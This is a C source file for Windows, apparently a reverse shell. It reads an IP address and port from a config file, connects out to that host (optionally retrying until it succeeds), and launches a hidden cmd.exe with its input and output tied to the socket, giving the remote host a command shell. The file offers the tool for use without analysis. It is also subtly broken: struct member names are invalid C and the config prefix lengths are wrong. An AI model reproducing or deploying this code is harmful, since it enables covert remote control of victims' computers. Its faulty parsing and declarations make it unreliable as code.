#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LINE_LENGTH 256
#define MAX_IP_LENGTH 50
#define MAX_PORT_LENGTH 20

typedef struct {
    char config.client_ip[MAX_IP_LENGTH];
    int config.client_port;
} Config;

int read_config(const char *filename, Config *config) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        printf("Error: Could not open file '%s'\n", filename);
        return -1;
    }

    char line[MAX_LINE_LENGTH];
    int ip_found = 0, port_found = 0;

    while (fgets(line, sizeof(line), file)) {
        // Remove newline character if present
        line[strcspn(line, "\n")] = '\0';

        // Skip empty lines and comments
        if (line[0] == '\0' || line[0] == '#') {
            continue;
        }

        // Parse config.client_ip
        if (strncmp(line, "config.client_ip=", 10) == 0) {
            strncpy(config->config.client_ip, line + 10, MAX_IP_LENGTH - 1);
            config->config.client_ip[MAX_IP_LENGTH - 1] = '\0';
            ip_found = 1;
        }

        // Parse config.client_port
        if (strncmp(line, "config.client_port=", 12) == 0) {
            config->config.client_port = atoi(line + 12);
            port_found = 1;
        }
    }

    fclose(file);

    if (!ip_found || !port_found) {
        printf("Warning: Not all required configuration values found\n");
        if (!ip_found) printf("  - config.client_ip not found\n");
        if (!port_found) printf("  - config.client_port not found\n");
    }

    return 0;
}


int main(void) {
	Config config;

    // Initialize config with empty/default values
    strcpy(config.config.client_ip, "");
    config.config.client_port = 0;

    // Read configuration
    if (read_config("rs.config", &config) == 0) {
        printf("Configuration loaded successfully:\n");
        printf("CLIENT_IP: %s\n", config.config.client_ip);
        printf("CLIENT_PORT: %d\n", config.config.client_port);
    } else {
        printf("Failed to load configuration\n");
        return 1;
    }

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = config.client_port;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(config.client_ip);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}
#endif

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}